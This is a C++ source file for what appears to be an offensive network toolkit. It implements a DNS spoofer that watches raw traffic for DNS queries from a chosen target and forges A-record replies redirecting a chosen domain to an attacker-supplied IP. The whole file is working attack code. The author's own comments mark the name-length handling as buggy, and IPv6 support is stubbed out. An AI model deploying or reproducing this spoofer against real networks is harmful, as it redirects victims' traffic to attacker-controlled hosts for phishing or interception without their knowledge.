#include "DNSSpoofer.h"

#include <iostream>

#include <cstring>
#include <net/if.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <linux/if_packet.h>
#include <poll.h>

CHaks::DNSSpoofer::DNSSpoofer()
{

}

CHaks::DNSSpoofer::~DNSSpoofer()
{
    
}

int CHaks::DNSSpoofer::Spoof(int socketFd, const char* interfaceName, char* targetIP, char* domain, char* fakeDomainIP)
{
    // using poll to monitor console input. If user enters something program will stop
    pollfd pollFds[1]{};
    pollFds[0].fd = 0;      
    pollFds[0].events = POLLIN;

    std::cout << "\nwaiting for valid DNS request from target...press enter to stop\n\n";

    while(true)
    {
        int nEvents = poll(pollFds, sizeof(pollFds) / sizeof(pollFds[0]), 0);
        if(nEvents == -1)
        {
            LOG_ERROR(APPLICATION_ERROR, "poll() error!");
            return APPLICATION_ERROR;
        }
        else if(nEvents == 0)
        {
            int res = ProcessPackets(socketFd, interfaceName, targetIP, domain, fakeDomainIP);
            if(res == APPLICATION_ERROR)
            {
                LOG_ERROR(APPLICATION_ERROR, "CHaks::DNSSpoofer::ProcessPackets() error");
                return APPLICATION_ERROR;
            }
        }
        else if(pollFds[0].revents & POLLIN)
        {
            std::cout << "stopping..." << std::endl;
            return NO_ERROR;
        }
    }
}

int CHaks::DNSSpoofer::ProcessPackets(int socketFd, const char* interfaceName, char* targetIP, char* domain, char* fakeDomainIP)
{
    PacketCraft::Packet packet;
    if(packet.Receive(socketFd, 0) == APPLICATION_ERROR)
    {
        // LOG_ERROR(APPLICATION_WARNING, "PacketCraft::Packet::Receive() error");
        return APPLICATION_WARNING;
    }

    DNSHeader* dnsHeader = (DNSHeader*)packet.FindLayerByType(PC_DNS_REQUEST);
    if(dnsHeader != nullptr && dnsHeader->qr == 0) // check that this is a dns query not a response
    {
        // check the ip version of the packet
        EthHeader* ethHeader = (EthHeader*)packet.GetLayerStart(0);
        if(ethHeader->ether_type == htons(ETH_P_IP))
        {
            sockaddr_in targetIPAddr{};
            inet_pton(AF_INET, targetIP, &targetIPAddr.sin_addr);

            IPv4Header* ipv4Header = (IPv4Header*)packet.GetLayerStart(1);
            if(targetIPAddr.sin_addr.s_addr == ipv4Header->ip_src.s_addr)
            {
                if(dnsParser.Parse(*dnsHeader) == APPLICATION_ERROR)
                {
                    LOG_ERROR(APPLICATION_ERROR, "DNSParser::Parse() error!");
                    return APPLICATION_ERROR;
                }

                for(unsigned int i = 0; i < dnsParser.header.qcount; ++i)
                {
                    if((PacketCraft::FindInStr(dnsParser.questionsArray[i].qName, domain) != -1) && dnsParser.questionsArray[i].qType == 1)
                    {
                        std::cout << "valid DNS request found, creating a response...\n";
                        PacketCraft::Packet dnsResponse;
                        CreateFakeDNSResponse(packet, dnsResponse, fakeDomainIP, IPVersion::IPV4, dnsParser.questionsArray[i]);

                        int ifIndex = if_nametoindex(interfaceName);
                        if(ifIndex == 0)
                        {
                            LOG_ERROR(APPLICATION_ERROR, "if_nametoindex() error!");
                            return APPLICATION_ERROR;
                        }

                        if(dnsResponse.Send(socketFd, interfaceName, 0) == APPLICATION_ERROR)
                        {
                            LOG_ERROR(APPLICATION_ERROR, "PacketCraft::Packet::Send() error");
                            return APPLICATION_ERROR;
                        }

                        std::cout << "response sent\n";
                    }
                }
            }
        }
        else if(ethHeader->ether_type == htons(ETH_P_IPV6)) // TODO: make sure ipv6 processing code below works
        {
            LOG_ERROR(APPLICATION_ERROR, "IPv6 not supported!");
            return APPLICATION_ERROR;

            sockaddr_in6 targetIPAddr{};
            inet_pton(AF_INET6, targetIP, &targetIPAddr.sin6_addr);

            IPv6Header* ipv6Header = (IPv6Header*)packet.GetLayerStart(1);
            if(memcmp(targetIPAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_src.__in6_u.__u6_addr8, 16) == 0)
            {
                if(dnsParser.Parse(*dnsHeader) == APPLICATION_ERROR)
                {
                    LOG_ERROR(APPLICATION_ERROR, "DNSParser::Parse() error!");
                    return APPLICATION_ERROR;
                }
            }
        }
    }

    return NO_ERROR;
}

int CHaks::DNSSpoofer::CreateFakeDNSResponse(PacketCraft::Packet& dnsRequestPacket, PacketCraft::Packet& dnsResponsePacket, 
    char* fakeDomainIP, IPVersion ipVersion,  const PacketCraft::DNSQuestion& question)
{
    EthHeader* dnsRequestEthHeader = (EthHeader*)dnsRequestPacket.FindLayerByType(PC_ETHER_II);
    dnsResponsePacket.AddLayer(PC_ETHER_II, ETH_HLEN);
    EthHeader* dnsResponseEthHeader = (EthHeader*)dnsResponsePacket.GetLayerStart(0);
    CreateEthHeader(*dnsResponseEthHeader, *dnsRequestEthHeader);
    
    if(ntohs(dnsRequestEthHeader->ether_type) == ETH_P_IP)
    {
        IPv4Header* dnsRequestIPv4Header = (IPv4Header*)dnsRequestPacket.FindLayerByType(PC_IPV4);
        dnsResponsePacket.AddLayer(PC_IPV4, sizeof(IPv4Header));
        IPv4Header* dnsResponseIPv4Header = (IPv4Header*)dnsResponsePacket.GetLayerStart(1);
        CreateIPv4Header(*dnsResponseIPv4Header, *dnsRequestIPv4Header);

        if(dnsResponseIPv4Header->ip_p == IPPROTO_UDP)
        {
            UDPHeader* dnsRequestUDPHeader = (UDPHeader*)dnsRequestPacket.FindLayerByType(PC_UDP);
            dnsResponsePacket.AddLayer(PC_UDP, sizeof(UDPHeader));
            UDPHeader* dnsResponseUDPHeader = (UDPHeader*)dnsResponsePacket.GetLayerStart(2);
            CreateUDPHeader(*dnsResponseUDPHeader, *dnsRequestUDPHeader);

            // finally add DNS layer
            DNSHeader* dnsRequestDNSHeader = (DNSHeader*)dnsRequestPacket.FindLayerByType(PC_DNS_REQUEST);

            // +2 because qName is not in dns format
            // +4 is the size of a dns question minus qName 
            uint32_t dnsQuestionSize = PacketCraft::GetStrLen(question.qName) + 2 + 4;

            uint32_t rDataLen{};
            if(ipVersion == IPVersion::IPV4)
                rDataLen = IPV4_ALEN;
            else if(ipVersion == IPVersion::IPV6)
                rDataLen = IPV6_ALEN;
            else    
            {
                LOG_ERROR(APPLICATION_ERROR, "ipVersion not supplied");
                return APPLICATION_ERROR;
            }

            // +2 because qName is not in dns format
            // 10 is the size of a dns answer minus aName and rData(fakeDomainIP)
            uint32_t dnsAnswerSize = PacketCraft::GetStrLen(question.qName) + 2 + rDataLen + 10;
            
            dnsResponsePacket.AddLayer(PC_DNS_RESPONSE, sizeof(DNSHeader) + dnsQuestionSize + dnsAnswerSize);
            DNSHeader* dnsResponseDNSHeader = (DNSHeader*)dnsResponsePacket.GetLayerStart(3); // TODO: remove hardcoded 3
            CreateDNSHeader(*dnsResponseDNSHeader, *dnsRequestDNSHeader, question, fakeDomainIP, ipVersion);

            dnsResponseIPv4Header->ip_len = htons(dnsResponsePacket.GetSizeInBytes() - sizeof(*dnsResponseEthHeader));
            dnsResponseIPv4Header->ip_sum = PacketCraft::CalculateChecksum(dnsResponseIPv4Header, sizeof(*dnsResponseIPv4Header));

            dnsResponseUDPHeader->len = htons(dnsResponsePacket.GetSizeInBytes() - sizeof(*dnsResponseEthHeader) - sizeof(*dnsResponseIPv4Header));
            dnsResponseUDPHeader->check = htons(0); // in ipv4, this is optional and therefor can be set to 0

            return NO_ERROR;
        }
        else if(dnsResponseIPv4Header->ip_p == IPPROTO_TCP)
        {
            // TODO: support for dns over tcp, and possibly others
            LOG_ERROR(APPLICATION_ERROR, "dns over tcp not supported!");
            return APPLICATION_ERROR;
        }
    }
    else if(ntohs(dnsRequestEthHeader->ether_type) == ETH_P_IPV6)
    {
        // TODO: support for ipv6
        LOG_ERROR(APPLICATION_ERROR, "ipv6 not supported!");
        return APPLICATION_ERROR;
    }

    LOG_ERROR(APPLICATION_ERROR, "invalid ether_type in dnsRequestEthHeader");
    return APPLICATION_ERROR;
}

int CHaks::DNSSpoofer::CreateEthHeader(EthHeader& dnsResponseEthHeader, const EthHeader& dnsRequestEthHeader)
{
    memcpy(dnsResponseEthHeader.ether_dhost, dnsRequestEthHeader.ether_shost, ETH_ALEN);
    memcpy(dnsResponseEthHeader.ether_shost, dnsRequestEthHeader.ether_dhost, ETH_ALEN);
    dnsResponseEthHeader.ether_type = dnsRequestEthHeader.ether_type;

    return NO_ERROR;
}

int CHaks::DNSSpoofer::CreateIPv4Header(IPv4Header& dnsResponseIPv4Header, const IPv4Header& dnsRequestIPv4Header)
{
    dnsResponseIPv4Header.ip_hl = sizeof(dnsRequestIPv4Header) * 8 / 32;
    dnsResponseIPv4Header.ip_v = IPVERSION;                       
    dnsResponseIPv4Header.ip_tos = IPTOS_CLASS_CS0;
    dnsResponseIPv4Header.ip_len = 0; // calculated later
    dnsResponseIPv4Header.ip_id = dnsRequestIPv4Header.ip_id;
    dnsResponseIPv4Header.ip_off = htons(IP_DF);
    dnsResponseIPv4Header.ip_ttl = IPDEFTTL;
    dnsResponseIPv4Header.ip_p = dnsRequestIPv4Header.ip_p;
    dnsResponseIPv4Header.ip_sum = htons(0); // calculated later
    dnsResponseIPv4Header.ip_dst.s_addr = dnsRequestIPv4Header.ip_src.s_addr;
    dnsResponseIPv4Header.ip_src.s_addr = dnsRequestIPv4Header.ip_dst.s_addr;

    return NO_ERROR;
}

int CHaks::DNSSpoofer::CreateUDPHeader(UDPHeader& dnsResponseUDPHeader, const UDPHeader& dnsRequestUDPHeader)
{
    dnsResponseUDPHeader.source = dnsRequestUDPHeader.dest;
    dnsResponseUDPHeader.dest = dnsRequestUDPHeader.source;
    dnsResponseUDPHeader.check = 0; // calculated later
    dnsResponseUDPHeader.len = 0; // calculated later

    return NO_ERROR;
}

// BUGGED TODO:FIX (qname and name len, nlabels is wrong in both questions and answers)
int CHaks::DNSSpoofer::CreateDNSHeader(DNSHeader& dnsResponseDNSHeader, const DNSHeader& dnsRequestDNSHeader, 
    const PacketCraft::DNSQuestion& question, char* fakeDomainIP, IPVersion ipVersion)
{
    dnsResponseDNSHeader.id = dnsRequestDNSHeader.id;
    dnsResponseDNSHeader.qr = 1;
    dnsResponseDNSHeader.opcode = 0;
    dnsResponseDNSHeader.aa = 0;
    dnsResponseDNSHeader.tc = 0;
    dnsResponseDNSHeader.rd = 0;
    dnsResponseDNSHeader.ra = 0;
    dnsResponseDNSHeader.zero = 0;
    dnsResponseDNSHeader.rcode = 0;

    dnsResponseDNSHeader.qcount = htons(1);
    dnsResponseDNSHeader.ancount = htons(1);
    dnsResponseDNSHeader.nscount = htons(0);
    dnsResponseDNSHeader.adcount = htons(0);

    uint16_t qTypeInNetworkByteOrder = htons(question.qType);
    uint16_t qClassInNetworkByteOrder = htons(question.qClass);
    char qNameInDNSFormat[FQDN_MAX_STR_LEN]{};
    if(PacketCraft::DomainToDNSName(question.qName, qNameInDNSFormat) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "PacketCraft::DomainToDNSName() error");
        return APPLICATION_ERROR;
    }

    // adding +1 because the last label length is 0. Apparantly it gets treated as a null terminating character, but we need it included
    uint32_t qNameLen = PacketCraft::GetStrLen(qNameInDNSFormat) + 1;

    // copy question to the dns response packet
    uint8_t* dnsResponseDataPtr = dnsResponseDNSHeader.querySection;
    memcpy(dnsResponseDataPtr, qNameInDNSFormat, qNameLen);
    dnsResponseDataPtr += qNameLen;
    memcpy(dnsResponseDataPtr, &qTypeInNetworkByteOrder, sizeof(qTypeInNetworkByteOrder));
    dnsResponseDataPtr += sizeof(qTypeInNetworkByteOrder);
    memcpy(dnsResponseDataPtr, &qClassInNetworkByteOrder, sizeof(qClassInNetworkByteOrder));
    dnsResponseDataPtr += sizeof(qClassInNetworkByteOrder); // ptr now points to the start of the answer

    // create answer
    memcpy(dnsResponseDataPtr, qNameInDNSFormat, qNameLen);
    dnsResponseDataPtr += qNameLen;
    *((uint16_t*)dnsResponseDataPtr) = htons(1); // type is A record
    dnsResponseDataPtr += 2;
    *((uint16_t*)dnsResponseDataPtr) = htons(1); // class is IN
    dnsResponseDataPtr += 2;
    *((uint32_t*)dnsResponseDataPtr) = htonl(300); // time to live is 5 minutes
    dnsResponseDataPtr += 4;
    *((uint16_t*)dnsResponseDataPtr) = htons(ipVersion == IPVersion::IPV4 ? IPV4_ALEN : IPV6_ALEN); // rdLength
    dnsResponseDataPtr += 2;

    sockaddr_in addr4;
    sockaddr_in6 addr6;

    if(ipVersion == IPVersion::IPV4)
    {
        if(inet_pton(AF_INET, fakeDomainIP, &addr4.sin_addr) == -1)
        {
            LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
            return APPLICATION_ERROR;
        }

        memcpy(dnsResponseDataPtr, &addr4.sin_addr.s_addr, IPV4_ALEN);
    }
    else if(ipVersion == IPVersion::IPV6)
    {
        if(inet_pton(AF_INET6, fakeDomainIP, &addr6.sin6_addr) == -1)
        {
            LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
            return APPLICATION_ERROR;
        }

        memcpy(dnsResponseDataPtr, &addr6.sin6_addr.__in6_u, IPV6_ALEN);
    }
    else
    {
        LOG_ERROR(APPLICATION_ERROR, "ipVersion not supplied");
        return APPLICATION_ERROR;
    }

    return NO_ERROR;
}